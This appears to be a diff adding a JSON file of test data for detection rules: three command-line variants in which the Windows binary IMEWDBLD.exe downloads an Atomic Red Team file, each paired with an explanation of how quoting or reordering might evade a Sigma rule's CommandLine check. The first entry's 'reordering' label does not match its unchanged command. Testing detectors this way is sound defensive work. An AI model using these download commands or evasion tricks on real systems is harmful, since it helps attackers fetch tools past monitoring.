@@ -1,0 +1,14 @@
+[
+  {
+    "output": "C:\\WINDOWS\\System32\\IME\\SHARED\\IMEWDBLD.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml",
+    "explanation": "Reordering: The command line arguments are reordered, which may cause the Sigma rule's CommandLine|contains check to miss the suspicious URL if the parser does not accept the reordering."
+  },
+  {
+    "output": "\"C:\\WINDOWS\\System32\\IME\\SHARED\\IMEWDBLD.exe\" \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml\"",
+    "explanation": "Insertion: Quotes are inserted around the URL, which may not be detected by the Sigma rule if it does not check for quoted strings."
+  },
+  {
+    "output": "C:\\WINDOWS\\System32\\IME\\SHARED\\IMEWDBLD.exe \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml\"",
+    "explanation": "Insertion: Quotes are inserted around the URL, which may not be detected by the Sigma rule if it does not check for quoted strings."
+  }
+]
